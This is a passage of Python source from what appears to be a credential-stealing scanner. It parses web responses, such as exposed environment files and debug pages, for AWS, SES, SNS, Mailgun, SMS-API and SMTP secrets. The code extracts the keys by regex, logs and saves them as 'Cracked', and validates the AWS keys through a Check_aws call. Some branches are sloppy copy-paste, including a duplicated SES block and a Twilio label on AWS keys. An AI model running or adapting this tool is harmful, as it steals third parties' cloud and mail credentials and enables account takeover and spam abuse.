		elif "<td>AMAZON_API_KEY</td>" in resp:
			aws_key = get_param(resp, "<td>AMAZON_API_KEY<\/td>\s+<td><pre.*>(.*?)<\/span>")
			aws_secret = get_param(resp, "<td>AMAZON_API_SECRET_KEY<\/td>\s+<td><pre.*>(.*?)<\/span>")
			aws_region = get_aws_region(resp)
			check_format = f"{aws_key}|{aws_secret}|{aws_region}"
			Normal_format = f"+++++++++++++++\nURL={url}\nAWS_KEY={aws_key}\nAWS_SECRET={aws_secret}\nAWS_REGION={aws_region}\n+++++++++++++++"			
			x = is_valid_info(check_format)
			if x:
				console.print(f"[+] AWS KEYS Found ==> {url} | DATA : {check_format}", style="green")
				Check_aws(aws_key, aws_secret, aws_region, url)

	elif "AWS_CLIENT_SECRET_KEY" in resp:
		if "AWS_CLIENT_SECRET_KEY=" in resp:
			aws_key = get_param(resp, "\nAWS_CLIENT_SECRET_KEY=(.*?)\n")
			aws_secret = get_param(resp, "\nAWS_SERVER_PUBLIC_KEY=(.*?)\n")
			aws_region = get_aws_region(resp)
			check_format = f"{aws_key}|{aws_secret}|{aws_region}"
			Normal_format = f"+++++++++++++++\nURL={url}\nAWS_KEY={aws_key}\nAWS_SECRET={aws_secret}\nAWS_REGION={aws_region}\n+++++++++++++++"			
			x = is_valid_info(check_format)
			if x:
				console.print(f"[+] AWS KEYS Found ==> {url} | DATA : {check_format}", style="green")
				Check_aws(aws_key, aws_secret, aws_region, url)
			

		elif "<td>AWS_CLIENT_SECRET_KEY</td>" in resp:
			aws_key = get_param(resp, "<td>AWS_CLIENT_SECRET_KEY<\/td>\s+<td><pre.*>(.*?)<\/span>")
			aws_secret = get_param(resp, "<td>AWS_SERVER_PUBLIC_KEY<\/td>\s+<td><pre.*>(.*?)<\/span>")
			aws_region = get_aws_region(resp)
			check_format = f"{aws_key}|{aws_secret}|{aws_region}"
			Normal_format = f"+++++++++++++++\nURL={url}\nAWS_KEY={aws_key}\nAWS_SECRET={aws_secret}\nAWS_REGION={aws_region}\n+++++++++++++++"			
			x = is_valid_info(check_format)
			if x:
				console.print(f"[+] AWS KEYS Found ==> {url} | DATA : {check_format}", style="green")
				Check_aws(aws_key, aws_secret, aws_region, url)
			

	elif "MAIL_SES_KEY" in resp:
		if "MAIL_SES_KEY=" in resp:
			aws_key = get_param(resp, "\nMAIL_SES_KEY=(.*?)\n")
			aws_secret = get_param(resp, "\nMAIL_SES_SECRET=(.*?)\n")
			aws_region = get_aws_region(resp)
			check_format = f"{aws_key}|{aws_secret}|{aws_region}"
			Normal_format = f"+++++++++++++++\nURL={url}\nAWS_KEY={aws_key}\nAWS_SECRET={aws_secret}\nAWS_REGION={aws_region}\n+++++++++++++++"			
			x = is_valid_info(check_format)
			if x:
				console.print(f"[+] AWS KEYS Found ==> {url} | DATA : {check_format}", style="green")
				Check_aws(aws_key, aws_secret, aws_region, url)
			

		elif "<td>MAIL_SES_KEY</td>" in resp:
			aws_key = get_param(resp, "<td>MAIL_SES_KEY<\/td>\s+<td><pre.*>(.*?)<\/span>")
			aws_secret = get_param(resp, "<td>MAIL_SES_SECRET<\/td>\s+<td><pre.*>(.*?)<\/span")
			aws_region = get_aws_region(resp)
			check_format = f"{aws_key}|{aws_secret}|{aws_region}"
			Normal_format = f"+++++++++++++++\nURL={url}\nAWS_KEY={aws_key}\nAWS_SECRET={aws_secret}\nAWS_REGION={aws_region}\n+++++++++++++++"			
			x = is_valid_info(check_format)
			if x:
				console.print(f"[+] AWS KEYS Found ==> {url} | DATA : {check_format}", style="green")
				Check_aws(aws_key, aws_secret, aws_region, url)
			

	elif "AWS_CLOUD_WATCH_KEY_ID" in resp:
		if "AWS_CLOUD_WATCH_KEY_ID=" in resp:
			aws_key = get_param(resp, "\nAWS_CLOUD_WATCH_KEY_ID=(.*?)\n")
			aws_secret = get_param(resp, "\nAWS_CLOUD_WATCH_KEY_ACCESS_KEY=(.*?)\n")
			aws_region = get_aws_region(resp)
			check_format = f"{aws_key}|{aws_secret}|{aws_region}"
			Normal_format = f"+++++++++++++++\nURL={url}\nAWS_KEY={aws_key}\nAWS_SECRET={aws_secret}\nAWS_REGION={aws_region}\n+++++++++++++++"			
			x = is_valid_info(check_format)
			if x:
				console.print(f"[+] AWS KEYS Found ==> {url} | DATA : {check_format}", style="green")
				Check_aws(aws_key, aws_secret, aws_region, url)

		elif "<td>AWS_CLOUD_WATCH_KEY_ID</td>" in resp:
			aws_key = get_param(resp, "<td>AWS_CLOUD_WATCH_KEY_ID<\/td>\s+<td><pre.*>(.*?)<\/span>")
			aws_secret = get_param(resp, "<td>AWS_CLOUD_WATCH_KEY_ACCESS_KEY<\/td>\s+<td><pre.*>(.*?)<\/span>")
			aws_region = get_aws_region(resp)
			check_format = f"{aws_key}|{aws_secret}|{aws_region}"
			Normal_format = f"+++++++++++++++\nURL={url}\nAWS_KEY={aws_key}\nAWS_SECRET={aws_secret}\nAWS_REGION={aws_region}\n+++++++++++++++"			
			x = is_valid_info(check_format)
			if x:
				console.print(f"[+] AWS KEYS Found ==> {url} | DATA : {check_format}", style="green")
				Check_aws(aws_key, aws_secret, aws_region, url)

	elif "OC_ACCESS_KEY_ID" in resp:
		if "OC_ACCESS_KEY_ID=" in resp:
			aws_key = get_param(resp, "\nOC_ACCESS_KEY_ID=(.*?)\n")
			aws_secret = get_param(resp, "\nOC_SECRET_ACCESS_KEY=(.*?)\n")
			aws_region = get_aws_region(resp)
			check_format = f"{aws_key}|{aws_secret}|{aws_region}"
			Normal_format = f"+++++++++++++++\nURL={url}\nAWS_KEY={aws_key}\nAWS_SECRET={aws_secret}\nAWS_REGION={aws_region}\n+++++++++++++++"			
			x = is_valid_info(check_format)
			if x:
				console.print(f"[+] AWS KEYS Found ==> {url} | DATA : {check_format}", style="green")
				Check_aws(aws_key, aws_secret, aws_region, url)

		elif "<td>OC_ACCESS_KEY_ID</td>" in resp:
			aws_key = get_param(resp, "<td>OC_ACCESS_KEY_ID<\/td>\s+<td><pre.*>(.*?)<\/span>")
			aws_secret = get_param(resp, "<td>OC_SECRET_ACCESS_KEY<\/td>\s+<td><pre.*>(.*?)<\/span>")
			aws_region = get_aws_region(resp)
			check_format = f"{aws_key}|{aws_secret}|{aws_region}"
			Normal_format = f"+++++++++++++++\nURL={url}\nAWS_KEY={aws_key}\nAWS_SECRET={aws_secret}\nAWS_REGION={aws_region}\n+++++++++++++++"			
			x = is_valid_info(check_format)
			if x:
				console.print(f"[+] AWS KEYS Found ==> {url} | DATA : {check_format}", style="green")
				Check_aws(aws_key, aws_secret, aws_region, url)

	elif "AWS_QUEUE_KEY" in resp:
		if "AWS_QUEUE_KEY=" in resp:
			aws_key = get_param(resp, "\nAWS_QUEUE_KEY=(.*?)\n")
			aws_secret = get_param(resp, "\nAWS_QUEUE_SECRET=(.*?)\n")
			aws_region = get_aws_region(resp)
			check_format = f"{aws_key}|{aws_secret}|{aws_region}"
			Normal_format = f"+++++++++++++++\nURL={url}\nAWS_KEY={aws_key}\nAWS_SECRET={aws_secret}\nAWS_REGION={aws_region}\n+++++++++++++++"			
			x = is_valid_info(check_format)
			if x:
				console.print(f"[+] AWS KEYS Found ==> {url} | DATA : {check_format}", style="green")
				Check_aws(aws_key, aws_secret, aws_region, url)

		elif "<td>AWS_QUEUE_KEY</td>" in resp:
			aws_key = get_param(resp, "<td>AWS_QUEUE_KEY<\/td>\s+<td><pre.*>(.*?)<\/span>")
			aws_secret = get_param(resp, "<td>AWS_QUEUE_SECRET<\/td>\s+<td><pre.*>(.*?)<\/span>")
			aws_region = get_aws_region(resp)
			check_format = f"{aws_key}|{aws_secret}|{aws_region}"
			Normal_format = f"+++++++++++++++\nURL={url}\nAWS_KEY={aws_key}\nAWS_SECRET={aws_secret}\nAWS_REGION={aws_region}\n+++++++++++++++"			
			x = is_valid_info(check_format)
			if x:
				console.print(f"[+] AWS KEYS Found ==> {url} | DATA : {check_format}", style="green")
				Check_aws(aws_key, aws_secret, aws_region, url)

	elif "DYNAMIC_ORGCODE_AWS_ACCESS_KEY_ID" in resp:
		if "DYNAMIC_ORGCODE_AWS_ACCESS_KEY_ID=" in resp:
			aws_key = get_param(resp, "\nDYNAMIC_ORGCODE_AWS_ACCESS_KEY_ID=(.*?)\n")
			aws_secret = get_param(resp, "\nDYNAMIC_ORGCODE_AWS_SECRET_ACCESS_KEY=(.*?)\n")
			aws_region = get_aws_region(resp)
			check_format = f"{aws_key}|{aws_secret}|{aws_region}"
			Normal_format = f"+++++++++++++++\nURL={url}\nAWS_KEY={aws_key}\nAWS_SECRET={aws_secret}\nAWS_REGION={aws_region}\n+++++++++++++++"			
			x = is_valid_info(check_format)
			if x:
				console.print(f"[+] AWS KEYS Found ==> {url} | DATA : {check_format}", style="green")
				Check_aws(aws_key, aws_secret, aws_region, url)

		elif "<td>DYNAMIC_ORGCODE_AWS_ACCESS_KEY_ID</td>" in resp:
			aws_key = get_param(resp, "<td>DYNAMIC_ORGCODE_AWS_ACCESS_KEY_ID<\/td>\s+<td><pre.*>(.*?)<\/span>")
			aws_secret = get_param(resp, "<td>DYNAMIC_ORGCODE_AWS_SECRET_ACCESS_KEY<\/td>\s+<td><pre.*>(.*?)<\/span>")
			aws_region = get_aws_region(resp)
			check_format = f"{aws_key}|{aws_secret}|{aws_region}"
			Normal_format = f"+++++++++++++++\nURL={url}\nAWS_KEY={aws_key}\nAWS_SECRET={aws_secret}\nAWS_REGION={aws_region}\n+++++++++++++++"			
			x = is_valid_info(check_format)
			if x:
				console.print(f"[+] AWS KEYS Found ==> {url} | DATA : {check_format}", style="green")
				Check_aws(aws_key, aws_secret, aws_region, url)

	elif "#SES_KEY" in resp:
		if "#SES_KEY=" in resp:
			aws_key = get_param(resp, "\n#SES_KEY=(.*?)\n")
			aws_secret = get_param(resp, "\n#SES_SECRET=(.*?)\n")
			aws_region = get_aws_region(resp)
			check_format = f"{aws_key}|{aws_secret}|{aws_region}"
			Normal_format = f"+++++++++++++++\nURL={url}\nAWS_KEY={aws_key}\nAWS_SECRET={aws_secret}\nAWS_REGION={aws_region}\n+++++++++++++++"			
			x = is_valid_info(check_format)
			if x:
				console.print(f"[+] AWS KEYS Found ==> {url} | DATA : {check_format}", style="green")
				Check_aws(aws_key, aws_secret, aws_region, url)
			

		elif "<td>#SES_KEY</td>" in resp:
			aws_key = get_param(resp, "<td>#SES_KEY<\/td>\s+<td><pre.*>(.*?)<\/span>")
			aws_secret = get_param(resp, "<td>#SES_SECRET<\/td>\s+<td><pre.*>(.*?)<\/span>")
			aws_region = get_aws_region(resp)
			check_format = f"{aws_key}|{aws_secret}|{aws_region}"
			Normal_format = f"+++++++++++++++\nURL={url}\nAWS_KEY={aws_key}\nAWS_SECRET={aws_secret}\nAWS_REGION={aws_region}\n+++++++++++++++"			
			x = is_valid_info(check_format)
			if x:
				console.print(f"[+] AWS KEYS Found ==> {url} | DATA : {check_format}", style="green")
				Check_aws(aws_key, aws_secret, aws_region, url)
			

	elif "#SES_KEY" in resp:
		if "#SES_KEY=" in resp:
			aws_key = get_param(resp, "\n#SES_KEY=(.*?)\n")
			aws_secret = get_param(resp, "\n#SES_SECRET=(.*?)\n")
			aws_region = get_aws_region(resp)
			check_format = f"{aws_key}|{aws_secret}|{aws_region}"
			Normal_format = f"+++++++++++++++\nURL={url}\nAWS_KEY={aws_key}\nAWS_SECRET={aws_secret}\nAWS_REGION={aws_region}\n+++++++++++++++"			
			x = is_valid_info(check_format)
			if x:
				console.print(f"[+] AWS KEYS Found ==> {url} | DATA : {check_format}", style="green")
				Check_aws(aws_key, aws_secret, aws_region, url)
			

		elif "<td>#SES_KEY</td>" in resp:
			aws_key = get_param(resp, "<td>#SES_KEY<\/td>\s+<td><pre.*>(.*?)<\/span>")
			aws_secret = get_param(resp, "<td>#SES_SECRET<\/td>\s+<td><pre.*>(.*?)<\/span>")
			aws_region = get_aws_region(resp)
			check_format = f"{aws_key}|{aws_secret}|{aws_region}"
			Normal_format = f"+++++++++++++++\nURL={url}\nAWS_KEY={aws_key}\nAWS_SECRET={aws_secret}\nAWS_REGION={aws_region}\n+++++++++++++++"			
			x = is_valid_info(check_format)
			if x:
				console.print(f"[+] AWS KEYS Found ==> {url} | DATA : {check_format}", style="green")
				Check_aws(aws_key, aws_secret, aws_region, url)


	elif "SNS_KEY" in resp:
		if "SNS_KEY=" in resp:
			aws_key = get_param(resp, "\nSNS_KEY=(.*?)\n")
			aws_secret = get_param(resp, "\nSNS_SECRET=(.*?)\n")
			aws_region = get_aws_region(resp)
			check_format = f"{aws_key}|{aws_secret}|{aws_region}"
			Normal_format = f"+++++++++++++++\nURL={url}\nAWS_KEY={aws_key}\nAWS_SECRET={aws_secret}\nAWS_REGION={aws_region}\n+++++++++++++++"			
			x = is_valid_info(check_format)
			if x:
				console.print(f"[+] AWS KEYS Found ==> {url} | DATA : {check_format}", style="green")
				Check_aws(aws_key, aws_secret, aws_region, url)

		elif "<td>SNS_KEY</td>" in resp:
			aws_key = get_param(resp, "<td>SNS_KEY<\/td>\s+<td><pre.*>(.*?)<\/span>")
			aws_secret = get_param(resp, "<td>SNS_SECRET<\/td>\s+<td><pre.*>(.*?)<\/span>")
			aws_region = get_aws_region(resp)
			check_format = f"{aws_key}|{aws_secret}|{aws_region}"
			Normal_format = f"+++++++++++++++\nURL={url}\nAWS_KEY={aws_key}\nAWS_SECRET={aws_secret}\nAWS_REGION={aws_region}\n+++++++++++++++"			
			x = is_valid_info(check_format)
			if x:
				console.print(f"[+] AWS KEYS Found ==> {url} | DATA : {check_format}", style="green")
				Check_aws(aws_key, aws_secret, aws_region, url)
			

	elif "AMAZON_SNS_ACCESS_KEY" in resp:
		if "AMAZON_SNS_ACCESS_KEY=" in resp:
			aws_key = get_param(resp, "\nAMAZON_SNS_ACCESS_KEY=(.*?)\n")
			aws_secret = get_param(resp, "\nAMAZON_SNS_SECRET_KEY=(.*?)\n")
			aws_region = get_aws_region(resp)
			check_format = f"{aws_key}|{aws_secret}|{aws_region}"
			Normal_format = f"+++++++++++++++\nURL={url}\nAWS_KEY={aws_key}\nAWS_SECRET={aws_secret}\nAWS_REGION={aws_region}\n+++++++++++++++"			
			x = is_valid_info(check_format)
			if x:
				console.print(f"[+] AWS KEYS Found ==> {url} | DATA : {check_format}", style="green")
				Check_aws(aws_key, aws_secret, aws_region, url)

		elif "<td>AMAZON_SNS_ACCESS_KEY</td>" in resp:
			aws_key = get_param(resp, "<td>AMAZON_SNS_ACCESS_KEY<\/td>\s+<td><pre.*>(.*?)<\/span>")
			aws_secret = get_param(resp, "<td>AMAZON_SNS_SECRET_KEY<\/td>\s+<td><pre.*>(.*?)<\/span>")
			aws_region = get_aws_region(resp)
			check_format = f"{aws_key}|{aws_secret}|{aws_region}"
			Normal_format = f"+++++++++++++++\nURL={url}\nAWS_KEY={aws_key}\nAWS_SECRET={aws_secret}\nAWS_REGION={aws_region}\n+++++++++++++++"			
			x = is_valid_info(check_format)
			if x:
				console.print(f"[+] AWS KEYS Found ==> {url} | DATA : {check_format}", style="green")
				Check_aws(aws_key, aws_secret, aws_region, url)

	elif "S3_AUDIO_ACCESS_KEY" in resp:
		if "S3_AUDIO_ACCESS_KEY=" in resp:
			aws_key = get_param(resp, "\nS3_AUDIO_ACCESS_KEY=(.*?)\n")
			aws_secret = get_param(resp, "\nS3_AUDIO_ACCESS_SECRET=(.*?)\n")
			aws_region = get_aws_region(resp)
			check_format = f"{aws_key}|{aws_secret}|{aws_region}"
			Normal_format = f"+++++++++++++++\nURL={url}\nAWS_KEY={aws_key}\nAWS_SECRET={aws_secret}\nAWS_REGION={aws_region}\n+++++++++++++++"			
			x = is_valid_info(check_format)
			if x:
				console.print(f"[+] AWS KEYS Found ==> {url} | DATA : {check_format}", style="green")
				Check_aws(aws_key, aws_secret, aws_region, url)

		elif "<td>S3_AUDIO_ACCESS_KEY</td>" in resp:
			aws_key = get_param(resp, "<td>S3_AUDIO_ACCESS_KEY<\/td>\s+<td><pre.*>(.*?)<\/span>")
			aws_secret = get_param(resp, "<td>S3_AUDIO_ACCESS_SECRET<\/td>\s+<td><pre.*>(.*?)<\/span>")
			aws_region = get_aws_region(resp)
			check_format = f"{aws_key}|{aws_secret}|{aws_region}"
			Normal_format = f"+++++++++++++++\nURL={url}\nAWS_KEY={aws_key}\nAWS_SECRET={aws_secret}\nAWS_REGION={aws_region}\n+++++++++++++++"			
			x = is_valid_info(check_format)
			if x:
				console.print(f"[+] AWS KEYS Found ==> {url} | DATA : {check_format}", style="green")
				Check_aws(aws_key, aws_secret, aws_region, url)

	elif "CLOUDWATCH_LOG_KEY" in resp:
		if "CLOUDWATCH_LOG_KEY=" in resp:
			aws_key = get_param(resp, "\nCLOUDWATCH_LOG_KEY=(.*?)\n")
			aws_secret = get_param(resp, "\nCLOUDWATCH_LOG_SECRET=(.*?)\n")
			aws_region = get_aws_region(resp)
			check_format = f"{aws_key}|{aws_secret}|{aws_region}"
			Normal_format = f"+++++++++++++++\nURL={url}\nAWS_KEY={aws_key}\nAWS_SECRET={aws_secret}\nAWS_REGION={aws_region}\n+++++++++++++++"			
			x = is_valid_info(check_format)
			if x:
				console.print(f"[+] AWS KEYS Found ==> {url} | DATA : {check_format}", style="green")
				Check_aws(aws_key, aws_secret, aws_region, url)

		elif "<td>CLOUDWATCH_LOG_KEY</td>" in resp:
			aws_key = get_param(resp, "<td>CLOUDWATCH_LOG_KEY<\/td>\s+<td><pre.*>(.*?)<\/span>")
			aws_secret = get_param(resp, "<td>CLOUDWATCH_LOG_SECRET<\/td>\s+<td><pre.*>(.*?)<\/span>")
			aws_region = get_aws_region(resp)
			check_format = f"{aws_key}|{aws_secret}|{aws_region}"
			Normal_format = f"+++++++++++++++\nURL={url}\nAWS_KEY={aws_key}\nAWS_SECRET={aws_secret}\nAWS_REGION={aws_region}\n+++++++++++++++"			
			x = is_valid_info(check_format)
			if x:
				console.print(f"[+] AWS KEYS Found ==> {url} | DATA : {check_format}", style="green")
				Check_aws(aws_key, aws_secret, aws_region, url)

	elif "SNS_ID" in resp:
		if "SNS_ID=" in resp:
			aws_key = get_param(resp, "\nSNS_ID=(.*?)\n")
			aws_secret = get_param(resp, "\nSNS_SECRET_KEY=(.*?)\n")
			aws_region = get_aws_region(resp)
			check_format = f"{aws_key}|{aws_secret}|{aws_region}"
			Normal_format = f"+++++++++++++++\nURL={url}\nAWS_KEY={aws_key}\nAWS_SECRET={aws_secret}\nAWS_REGION={aws_region}\n+++++++++++++++"			
			x = is_valid_info(check_format)
			if x:
				console.print(f"[+] AWS KEYS Found ==> {url} | DATA : {check_format}", style="green")
				Check_aws(aws_key, aws_secret, aws_region, url)

		elif "<td>SNS_ID</td>" in resp:
			aws_key = get_param(resp, "<td>SNS_ID<\/td>\s+<td><pre.*>(.*?)<\/span>")
			aws_secret = get_param(resp, "<td>SNS_SECRET_KEY<\/td>\s+<td><pre.*>(.*?)<\/span>")
			aws_region = get_aws_region(resp)
			check_format = f"{aws_key}|{aws_secret}|{aws_region}"
			Normal_format = f"+++++++++++++++\nURL={url}\nAWS_KEY={aws_key}\nAWS_SECRET={aws_secret}\nAWS_REGION={aws_region}\n+++++++++++++++"			
			x = is_valid_info(check_format)
			if x:
				console.print(f"[+] AWS KEYS Found ==> {url} | DATA : {check_format}", style="green")
				Check_aws(aws_key, aws_secret, aws_region, url)

	elif "AWS_ACCESS_KEY_ID_SNAPSHOT" in resp:
		if "AWS_ACCESS_KEY_ID_SNAPSHOT=" in resp:
			aws_key = get_param(resp, "\nAWS_ACCESS_KEY_ID_SNAPSHOT=(.*?)\n")
			aws_secret = get_param(resp, "\nAWS_SECRET_ACCESS_KEY_SNAPSHOT=(.*?)\n")
			aws_region = get_aws_region(resp)
			check_format = f"{aws_key}|{aws_secret}|{aws_region}"
			Normal_format = f"+++++++++++++++\nURL={url}\nAWS_KEY={aws_key}\nAWS_SECRET={aws_secret}\nAWS_REGION={aws_region}\n+++++++++++++++"			
			x = is_valid_info(check_format)
			if x:
				console.print(f"[+] AWS KEYS Found ==> {url} | DATA : {check_format}", style="green")
				Check_aws(aws_key, aws_secret, aws_region, url)

		elif "<td>AWS_ACCESS_KEY_ID_SNAPSHOT</td>" in resp:
			aws_key = get_param(resp, "<td>AWS_ACCESS_KEY_ID_SNAPSHOT<\/td>\s+<td><pre.*>(.*?)<\/span>")
			aws_secret = get_param(resp, "<td>AWS_SECRET_ACCESS_KEY_SNAPSHOT<\/td>\s+<td><pre.*>(.*?)<\/span>")
			aws_region = get_aws_region(resp)
			check_format = f"{aws_key}|{aws_secret}|{aws_region}"
			Normal_format = f"+++++++++++++++\nURL={url}\nAWS_KEY={aws_key}\nAWS_SECRET={aws_secret}\nAWS_REGION={aws_region}\n+++++++++++++++"			
			x = is_valid_info(check_format)
			if x:
				console.print(f"[+] AWS KEYS Found ==> {url} | DATA : {check_format}", style="green")
				Check_aws(aws_key, aws_secret, aws_region, url)

	elif "AWSOWL_ACCESS_KEY_ID" in resp:
		if "AWSOWL_ACCESS_KEY_ID=" in resp:
			aws_key = get_param(resp, "\nAWSOWL_ACCESS_KEY_ID=(.*?)\n")
			aws_secret = get_param(resp, "\nAWSOWL_SECRET_ACCESS_KEY=(.*?)\n")
			aws_region = get_aws_region(resp)
			check_format = f"{aws_key}|{aws_secret}|{aws_region}"
			Normal_format = f"+++++++++++++++\nURL={url}\nAWS_KEY={aws_key}\nAWS_SECRET={aws_secret}\nAWS_REGION={aws_region}\n+++++++++++++++"			
			x = is_valid_info(check_format)
			if x:
				console.print(f"[+] AWS KEYS Found ==> {url} | DATA : {check_format}", style="green")
				Check_aws(aws_key, aws_secret, aws_region, url)

		elif "<td>AWSOWL_ACCESS_KEY_ID</td>" in resp:
			aws_key = get_param(resp, "<td>AWSOWL_ACCESS_KEY_ID<\/td>\s+<td><pre.*>(.*?)<\/span>")
			aws_secret = get_param(resp, "<td>AWSOWL_SECRET_ACCESS_KEY<\/td>\s+<td><pre.*>(.*?)<\/span>")
			aws_region = get_aws_region(resp)
			check_format = f"{aws_key}|{aws_secret}|{aws_region}"
			Normal_format = f"+++++++++++++++\nURL={url}\nAWS_KEY={aws_key}\nAWS_SECRET={aws_secret}\nAWS_REGION={aws_region}\n+++++++++++++++"						
			x = is_valid_info(check_format)
			if x:
				console.print(f"[+] AWS KEYS Found ==> {url} | DATA : {check_format}", style="green")
				Check_aws(aws_key, aws_secret, aws_region, url)

	elif "WAS_ACCESS_KEY_ID" in resp:
		if "WAS_ACCESS_KEY_ID=" in resp:
			aws_key = get_param(resp, "\nWAS_ACCESS_KEY_ID=(.*?)\n")
			aws_secret = get_param(resp, "\nWAS_ACCESS_KEY_ID=(.*?)\n")
			aws_region = get_aws_region(resp)
			check_format = f"{aws_key}|{aws_secret}|{aws_region}"
			Normal_format = f"+++++++++++++++\nURL={url}\nAWS_KEY={aws_key}\nAWS_SECRET={aws_secret}\nAWS_REGION={aws_region}\n+++++++++++++++"						
			
			x = is_valid_info(check_format)
			if x:
				console.print(f"[+] Twilio Found ==> {url} | DATA : {check_format}", style="green")
				Check_aws(aws_key, aws_secret, aws_region, url)

		elif "<td>WAS_ACCESS_KEY_ID</td>" in resp:
			aws_key = get_param(resp, "<td>WAS_ACCESS_KEY_ID<\/td>\s+<td><pre.*>(.*?)<\/span>")
			aws_secret = get_param(resp, "<td>WAS_ACCESS_KEY_ID<\/td>\s+<td><pre.*>(.*?)<\/span>")
			aws_region = get_aws_region(resp)
			check_format = f"{aws_key}|{aws_secret}|{aws_region}"
			Normal_format = f"+++++++++++++++\nURL={url}\nAWS_KEY={aws_key}\nAWS_SECRET={aws_secret}\nAWS_REGION={aws_region}\n+++++++++++++++"						
			
			x = is_valid_info(check_format)
			if x:
				console.print(f"[+] AWS KEYS Found ==> {url} | DATA : {check_format}", style="green")
				Check_aws(aws_key, aws_secret, aws_region, url)
	else:
		if "AKIA" in resp:
			xSave("Cracked", "AKIA", url)
			console.print(f"[+] AKIA Found In ==> {url}", style="green")

def get_smtps(resp, url):
	if "MAILGUN_DOMAIN" in resp:
		if "MAILGUN_SECRET=" in resp:
			sid = get_param(resp, "\nMAILGUN_DOMAIN=(.*?)\n")
			secret = get_param(resp, "\nMAILGUN_SECRET=(.*?)\n")
			endpoint = get_param(resp, "\nMAILGUN_ENDPOINT=(.*?)\n")
			check_format = f"{sid}|{secret}|{endpoint}"
			x = is_valid_info(check_format)
			if x:
				xSave("Cracked", "SMTPS-[MAILGUN]", check_format)
				console.print(f"[+] MailGun Found ==> {url} | DATA : {check_format}", style="green")

		elif "<td>MAILGUN_DOMAIN</td>" in resp:
			sid = get_param(resp, "<td>MAILGUN_DOMAIN<\/td>\s+<td><pre.*>(.*?)<\/span>")
			secret = get_param(resp, "<td>MAILGUN_SECRET<\/td>\s+<td><pre.*>(.*?)<\/span>")
			endpoint = get_param(resp, "<td>MAILGUN_ENDPOINT<\/td>\s+<td><pre.*>(.*?)<\/span>")
			check_format = f"{sid}|{secret}|{endpoint}"
			x = is_valid_info(check_format)
			if x:
				xSave("Cracked", "SMTPS-[MAILGUN]", check_format)
				console.print(f"[+] MailGun Found ==> {url} | DATA : {check_format}", style="green")

	elif "SMS_API_SENDER_ID" in resp:
		if "SMS_API_SENDER_ID=" in resp:
			sid = get_param(resp, "\nSMS_API_SENDER_ID=(.*?)\n")
			secret = get_param(resp, "\nSMS_API_TOKEN=(.*?)\n")
			phone = get_param(resp, "\nSMS_API_FROM=(.*?)\n")
			check_format = f"{sid}|{secret}|{phone}"
			x = is_valid_info(check_format)
			if x:
				xSave("Cracked", "SMS-[API]", check_format)
				console.print(f"[+] SMS API Found ==> {url} | DATA : {check_format}", style="green")

		elif "<td>SMS_API_SENDER_ID</td>" in resp:
			sid = get_param(resp, "<td>SMS_API_SENDER_ID<\/td>\s+<td><pre.*>(.*?)<\/span>")
			secret = get_param(resp, "<td>SMS_API_TOKEN<\/td>\s+<td><pre.*>(.*?)<\/span>")
			phone = get_param(resp, "<td>SMS_API_FROM<\/td>\s+<td><pre.*>(.*?)<\/span>")
			check_format = f"{sid}|{secret}|{phone}"
			x = is_valid_info(check_format)
			if x:
				xSave("Cracked", "SMS-[API]", check_format)
				console.print(f"[+] SMS API Found ==> {url} | DATA : {check_format}", style="green")

	if "email.SMTPHost" in resp:
		if "email.SMTPHost = " in resp:
			host = get_param(resp, "\nemail.SMTPHost = (.*?)\n")
			port = get_param(resp, "\nemail.SMTPPort = (.*?)\n")
			username = get_param(resp, "\nemail.SMTPUser = (.*?)\n")
			password = get_param(resp, "\nemail.SMTPPass = (.*?)\n")

			mail_from = "info@WeedyDev.in" if get_param(resp, "\nemail.SMTPFrom = (.*?)\n") == '-' else get_param(resp, "\nemail.SMTPFrom = (.*?)\n")
			from_name = "WeedyDev" if get_param(resp, "\nemail.SMTPFromName = (.*?)\n") == '-' else get_param(resp, "\nemail.SMTPFromName = (.*?)\n")

			filter_format = filter_smtp(f"{host}|{port}|{username}|{password}")

			if filter_format:
				check_format = f"+++++++++++++++\nHOST={host}\nPORT={port}\nUSERNAME={username}\nPASSWORD={password}\nMAIL_FROM={mail_from}\nFROM_NAME={from_name}\n+++++++++++++++"
				xSave("Cracked", "SMTPS-[CRACKED]", check_format)
				console.print(f'[+] Vuln !!  => {url}', style='green')

	if "MAIL_HOST" in resp:
		if "MAIL_HOST=" in resp:
			host = get_param(resp, "\nMAIL_HOST=(.*?)\n")
			port = get_param(resp, "\nMAIL_PORT=(.*?)\n")
			username = get_param(resp, "\nMAIL_USERNAME=(.*?)\n")
			password = get_param(resp, "\nMAIL_PASSWORD=(.*?)\n")

			mail_from = "info@WeedyDev.in" if get_param(resp, "\nMAIL_FROM_ADDRESS=(.*?)\n") == '-' else get_param(resp, "\nMAIL_FROM_ADDRESS=(.*?)\n")
			from_name = "WeedyDev" if get_param(resp, "\nMAIL_FROM_NAME=(.*?)\n") == '-' else get_param(resp, "\nMAIL_FROM_NAME=(.*?)\n")

			filter_format = filter_smtp(f"{host}|{port}|{username}|{password}")

			if filter_format:
				check_format = f"+++++++++++++++\nHOST={host}\nPORT={port}\nUSERNAME={username}\nPASSWORD={password}\nMAIL_FROM={mail_from}\nFROM_NAME={from_name}\n+++++++++++++++"
				xSave("Cracked", "SMTPS-[CRACKED]", check_format)
				console.print(f'[+] Vuln !!  => {url}', style='green')

		elif "<td>MAIL_HOST</td>" in resp:
			host = get_param(resp, "<td>MAIL_HOST<\/td>\s+<td><pre.*>(.*?)<\/span>")
			port = get_param(resp, "<td>MAIL_PORT<\/td>\s+<td><pre.*>(.*?)<\/span>")
			username = get_param(resp, "<td>MAIL_USERNAME<\/td>\s+<td><pre.*>(.*?)<\/span>")
			password = get_param(resp, "<td>MAIL_PASSWORD<\/td>\s+<td><pre.*>(.*?)<\/span>")

			mail_from = "info@WeedyDev.in" if get_param(resp, "\nMAIL_FROM_ADDRESS=(.*?)\n") == '-' else get_param(resp, "\nMAIL_FROM_ADDRESS=(.*?)\n")
			from_name = "WeedyDev" if get_param(resp, "\nMAIL_FROM_NAME=(.*?)\n") == '-' else get_param(resp, "\nMAIL_FROM_NAME=(.*?)\n")

			filter_format = filter_smtp(f"{host}|{port}|{username}|{password}")

			if filter_format:
				check_format = f"+++++++++++++++\nHOST={host}\nPORT={port}\nUSERNAME={username}\nPASSWORD={password}\nMAIL_FROM={mail_from}\nFROM_NAME={from_name}\n+++++++++++++++"
				xSave("Cracked", "SMTPS-[CRACKED]", check_format)
				console.print(f'[+] Vuln !!  => {url}', style='green')

	if "MAIL_SMTP_SERVER " in resp:
		if "MAIL_SMTP_SERVER =" in resp:
			host = get_param(resp, "\nMAIL_SMTP_SERVER =(.*?)\n")
